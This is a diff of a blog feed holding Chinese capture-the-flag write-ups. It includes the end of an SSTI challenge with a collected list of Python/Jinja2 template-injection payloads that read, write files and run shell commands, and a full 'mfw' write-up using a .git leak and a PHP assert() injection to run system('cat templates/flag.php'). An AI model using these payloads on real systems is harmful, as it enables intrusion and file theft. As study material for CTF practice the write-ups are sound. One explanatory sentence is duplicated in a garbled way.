     <content><![CDATA[<h1 id="攻防世界-Confusion1"><a href="#攻防世界-Confusion1" class="headerlink" title="攻防世界 Confusion1"></a>攻防世界 Confusion1</h1><p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171818134.png" alt="image-20220103171818134">打开题目是这样</p>
@@ -2681,6 +2641,46 @@
 <p>常见payload收集</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line">% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>攻防世界 mfw git泄露</title>
+    <url>/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="攻防世界-mfw-git泄露"><a href="#攻防世界-mfw-git泄露" class="headerlink" title="攻防世界 mfw git泄露"></a>攻防世界 mfw git泄露</h1><p>由于昨天才学了git，找一道题来练练手</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092755185.png" alt="image-20220102092755185"></p>
+<p>点进去在about页面发现git关键词，访问.git目录</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092836849.png" alt="image-20220102092836849"></p>
+<p>存在泄露</p>
+<p>用githack把源码下载下来</p>
+<p>下载下来后发现一个flag.php</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093430458.png" alt="image-20220102093430458"></p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093531927.png" alt="image-20220102093531927"></p>
+<p>再看看其他的php</p>
+<p>在index.php中有这样一段php</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093735231.png" alt="image-20220102093735231"></p>
+<p>asserter()函数可以吧字符串当成php执行，这page又没有过滤，然后就想到用system来读取flag</p>
+<p>先试一下吧strpos给注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=%27).phpinfo();//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100454145.png" alt="image-20220102100454145"></p>
+<p>芜湖！</p>
+<p>最后用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=&#x27;).system(cat templates/flag.php);//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100753784.png" alt="image-20220102100753784"></p>
+<p>要打开源码才看得见</p>
+<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102102441825.png" alt="image-20220102102441825"></p>
+<p>然后又看到了另一种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?page=abc&#x27;) or system(&quot;cat templates/flag.php&quot;);//</span><br></pre></td></tr></table></figure>
+
+<p>$file =templates/ abc’) or system(“cat templates/flag.php”);// “.php”<br> 因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用” // “将后面的语句注释掉</p>
+<p><a href="https://www.cnblogs.com/xhds/p/12255609.html">PHP代码执行漏洞 - 笑花大王 - 博客园 (cnblogs.com)</a></p>
+<p>其他泄露：<br>.svn源码泄露：当可以访问到/.svn/entries的时候，就证明存在。<br>DS_Store 文件泄露：当访问/.ds_store可以访问的到，就证明存在。<br>.hg 源码泄露：当访问/.hg存在的时候，就证明存在该漏洞。<br>常见编辑器备份文件泄露：<br>http://[ip]/.test.php.swp<br>http://[ip]/test.php.bak<br>http://[ip]/test.jsp.old<br>http://[ip]/cgi~<br>http://[ip]/index.php~</p>
+<p>or用法补充</p>
+<p>经常看到这样的语句：<br>file=fopen(file=fopen(filename, ‘r’) or die(“抱歉，无法打开: filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以file既可以是int也可以bool，所以这样的语句不会报错。但其处理过程可能有些朋友不大明白。<br>其实在大多数的语言中， bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了。这里也是的，所以如果fopen函数执行正确的话，会返回一个大于0的int值（这其实就是“真”），后面的语句就不会执行了。如果fopen函数执行失败，就会返回false，那么就会判断后面的表达式是否为真了。<br>结果执行了die()之后，不管返回什么，程序都已经停止执行了，并且显示指定的出错信息，也就达到了调试的目的。<br>就这样。</p>
 ]]></content>
       <categories>
         <category>-Experience</category>
